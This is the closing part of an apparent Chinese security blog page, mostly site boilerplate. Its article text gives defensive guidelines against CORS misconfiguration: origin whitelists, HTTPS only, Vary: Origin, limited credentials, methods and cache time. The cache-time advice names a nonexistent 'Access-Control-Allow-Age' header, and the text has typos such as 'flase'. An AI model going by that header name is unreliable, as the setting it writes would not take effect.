+<h4 id="4-1-一般守则"><a href="#4-1-一般守则" class="headerlink" title="4.1 一般守则"></a>4.1 <strong>一般守则</strong></h4><ul>
+<li><p><strong>如果不必要就不要开启CORS</strong></p>
+<p>要仔细评估是否开启CORS，如果没有必要，建议不要使用CORS，以免削弱SOP</p>
+</li>
+<li><p><strong>定义白名单</strong></p>
+<p>绝对必要的话，要定义“源”白名单，如果有可能不要使用正则表达式，正则表达式更容易出错，导致CORS的配置错误。不要配置“Access-Control-Allow-Origin”为通配符*，要严格校验请求数据中Origin的值，要检查Origin是一个可信的值。</p>
+</li>
+<li><p><strong>仅允许安全的协议</strong></p>
+<p>有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MITM)将绕过应用所使用的HTTPS。</p>
+</li>
+<li><p><strong>配置”VARY”头部</strong></p>
+<p>要尽可能返回“VARY：Origin”这个头部，以避免攻击者利用浏览器缓存。</p>
+</li>
+<li><p><strong>尽可能避免使用”CREDENTIALS”</strong></p>
+<p>如果Access-Control-Allow-credentials标头设置成true时，允许跨域请求中带有凭据数据，因此只要在严格必要才应配置。如果对参数设置模糊的话，就把值设置成“flase” </p>
+</li>
+<li><p><strong>限制使用的方法</strong></p>
+<p>通过”Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样就可以最大限度的减少所设计的方法，养成这个好习惯。</p>
+</li>
+<li><p><strong>限制缓存时间</strong></p>
+<p>建议通过“Access-Control-Allow-Method”和“Access-Control-ALlow-Headers”头部，限制浏览器缓存信息得时间。可以通过使用”Access-Control-Allow-Age”标题来完成，该头部接受时间作为输入，该数字是浏览器保存缓存的时间。配置相互较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。</p>
+</li>
+<li><p><strong>仅配置所需要的头</strong></p>
+<p>要仅在接受到跨域请求的时候才去配置有关跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）</p>
+</li>
+<li><p><strong>中转服务器</strong></p>
+<p>也是目前最常用的方法，使用Node.js搭建中转服务器，来进行请求的转发。</p>
+</li>
+</ul>
+<h4 id="4-2-配置和实施"><a href="#4-2-配置和实施" class="headerlink" title="4.2 配置和实施"></a>4.2 <strong>配置和实施</strong></h4><p>  ​    很多框架是允许使用CORS的，当使用这些解决方案的时候，我们要着重++,注意默认值++（“origin”和”credebtials”是否被明确的设置）因为有些默认值是不安全的。</p>
+<p>  分析一些主要的软件框架。下面表是总结的结果（注：这仅指默认设置，在所有情况下都可以以安全的方式配置它们）</p>
+<p>   <img src="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e31ff96-b980-1.png" alt="img">     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20180916151629-6e7026a4-b980-1.png" alt="img" style="zoom: 50%;"> </p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    </div>
+
+    
+    
+    
+  <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+    
+    </div>
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%AE%BE%E7%BD%AE/" rel="tag"># 不安全的设置</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9AJQuery%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/" rel="prev" title="漏洞名称：JQuery版本漏洞">
+      <i class="fa fa-chevron-left"></i> 漏洞名称：JQuery版本漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8JBoss%E3%80%81WebSphere%E3%80%81WebLogin%E7%AD%89/" rel="next" title="漏洞名称：服务器JBoss、WebSphere、WebLogin等">
+      漏洞名称：服务器JBoss、WebSphere、WebLogin等 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=551340498&auto=1&height=66"></iframe>
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-简介"><span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-SOP（Same-Origin-Policy，同源策略）-amp-CORS"><span class="nav-text">0x01 SOP（Same Origin Policy，同源策略）&amp;CORS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-泄露用户数据"><span class="nav-text">0x02 泄露用户数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-CORS错误配置"><span class="nav-text">0x03 CORS错误配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-检测方法"><span class="nav-text">0x04 检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-三步测试CORS错误配置"><span class="nav-text">4.1 三步测试CORS错误配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性"><span class="nav-text">4.2 存在Access-Control-Allow-Credentials：true时，基于CORS配置的可用性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3服务器端缓存中毒"><span class="nav-text">4.3服务器端缓存中毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-4-绕过技术"><span class="nav-text">4.4 绕过技术</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-安全防御措施"><span class="nav-text">0x05 安全防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-一般守则"><span class="nav-text">4.1 一般守则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-配置和实施"><span class="nav-text">4.2 配置和实施</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="л"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">л</p>
+  <div class="site-description" itemprop="description">Find the bug of the world</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cosmosk" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cosmosk" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9d1870e83453" title="jianshu → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9d1870e83453" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>jianshu</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">л</span>
+</div>
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
+  </div>
+  <div id="days"></div>
+<script>
+function show_date_time(){
+    window.setTimeout("show_date_time()", 1000);
+    BirthDay=new Date("04/17/2018 15:13:14");//修改为自己的blog建站时间
+    today=new Date();
+    timeold=(today.getTime()-BirthDay.getTime());
+    sectimeold=timeold/1000
+    secondsold=Math.floor(sectimeold);
+    msPerDay=24*60*60*1000
+    e_daysold=timeold/msPerDay
+    daysold=Math.floor(e_daysold);
+    e_hrsold=(e_daysold-daysold)*24;
+    hrsold=setzero(Math.floor(e_hrsold));
+    e_minsold=(e_hrsold-hrsold)*60;
+    minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+    seconds=setzero(Math.floor((e_minsold-minsold)*60));
+    document.getElementById('days').innerHTML="本站已安全运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+    if (i<10)
+    {i="0" + i};
+    return i;
+}
+show_date_time();
+</script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
